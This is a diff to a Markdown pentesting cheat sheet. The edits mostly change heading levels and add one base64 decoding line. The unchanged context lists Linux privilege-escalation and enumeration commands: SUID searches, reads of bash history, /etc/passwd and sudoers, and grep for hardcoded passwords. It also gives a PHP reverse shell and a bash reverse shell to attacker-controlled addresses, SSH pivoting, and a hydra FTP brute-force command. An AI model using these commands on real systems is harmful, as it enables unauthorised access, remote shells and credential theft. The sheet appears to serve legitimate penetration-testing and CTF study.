@@ -14,56 +14,56 @@
 
 ## System Enumeration
 
-### Search for keyword
+#### Search for keyword
 
 `grep -ri "word" /`
 `grep -ri "search term` /| grep -Fv "excluded term"
 
-### Find SUID bits
+#### Find SUID bits
 
 `find / -perm -u=s -type f 2>/dev/null`
 `find / -user root -perm -4000 -exec ls -ldb {} \;`
 
-### Find human readable strings in binary
+#### Find human readable strings in binary
 
 `strings /usr/bin/menu`
 
-### Services running as Root
+#### Services running as Root
 
 `ps aux | grep root`
 
-### Show System Distribution and Version
+#### Show System Distribution and Version
 
 `cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;`
 
-### Show System Architecture
+#### Show System Architecture
 
 `cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release`
 
-### Find Writable Config Files
+#### Find Writable Config Files
 
 `find /etc/ -writable -type f 2>/dev/null`
 
-### Find Miss-configured Services
+#### Find Miss-configured Services
 
 `cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`
 
-### Show Scheduled Cron Jobs
+#### Show Scheduled Cron Jobs
 
 `crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny`
 
-### Find Hardcoded Passwords
+#### Find Hardcoded Passwords
 
 `grep -i user [filename]`
 `grep -i pass [filename]`
 `grep -C 5 "password" [filename]`
 `find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"`
 
-### Find World Readable/Writable Files
+#### Find World Readable/Writable Files
 
 `echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;`
 
-### Find World Readable Files
+#### Find World Readable Files
 
 `find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print`
 
@@ -74,27 +74,27 @@
 
 ## User Enumeration
 
-### Show Groups Users In
+#### Show Groups Users In
 
 `id`
 
-### Show Users Sudo Permissions
+#### Show Users Sudo Permissions
 
 `sudo -l`
 
-### List All Users Home Directories
+#### List All Users Home Directories
 
 `ls -ahlR /root/; ls -ahlR /home/`
 
-### Show Users Bash History
+#### Show Users Bash History
 
 `cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history`
 
-### Show Users Mail
+#### Show Users Mail
 
 `cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root`
 
-### Find Other Users
+#### Find Other Users
 
 `id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l`
 
@@ -105,7 +105,7 @@
 
 ## Network Enumeration
 
-### Show Connections
+#### Show Connections
 
 `netstat -ano`
 
@@ -116,7 +116,7 @@
 
 ## Privilege Escalation
 
-### Priv Esc systemctl with user access
+#### Priv Esc systemctl with user access
 
 _Create protection.service file in writable directory_
 
@@ -140,7 +140,7 @@ WantedBy=multi-user.target
 
 ## Shells
 
-### Escaping no tty shell
+#### Escaping no tty shell
 
 `/usr/bin/script -qc /bin/bash /dev/null`
 
@@ -166,14 +166,14 @@ _or_
 
 `xterm`
 
-### PHP reverse shell
+#### PHP reverse shell
 
 ```
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
 ```
 
-### Bash Reverse Shell
+#### Bash Reverse Shell
 
 `bash-c'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
 
@@ -184,15 +184,15 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
 
 ## Useful Commands
 
-### Grep IPs out of file
+#### Grep IPs out of file
 
 `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt`
 
-### Add Directory to PATH
+#### Add Directory to PATH
 
 export PATH=/tmp:$PATH
 
-### Edit Wifi Connections
+#### Edit Wifi Connections
 
 `nmtui`
 
@@ -200,12 +200,12 @@ _or_
 
 `nmcli`
 
-### Spin up webserver
+#### Spin up webserver
 
 `python -m SimpleHTTPServer 80`
 `php -S 0.0.0.0:80 -t .`
 
-### SSH Port Forwarding
+#### SSH Port Forwarding
 
 `ssh -D localhost:9999 -f -N root@172.30.72.97 -p 40384`
 
@@ -223,15 +223,15 @@ Now you can access 172.24.0.2:80, which you didn't have direct access to
 <KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
 run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it
 
-### sshuttle
+#### sshuttle
 
 `sshuttle --dns -vvr user@targetip -x targetip 0/0`
 
-### Pull Hash from Password Protected Zip
+#### Pull Hash from Password Protected Zip
 
 `zip2john file.zip > hash`
 
-### Find Specific Users Shell Type
+#### Find Specific Users Shell Type
 
 `finger $USER | grep 'Shell:*' | cut -f3 -d ":"`
 `getent passwd $LOGNAME | cut -d: -f7`
@@ -241,6 +241,10 @@ run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will g
 `cat /run/motd.dynamic`
 `sudo run-parts /etc/update-motd.d/`
 
-### Brute Force FTP Login
+#### Brute Force FTP Login
 
 `hydra -L users.txt -P /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 192.168.79.46 ftp –V -f `
+
+#### Decode Base64
+
+`echo -n base64string | base64 --decode`
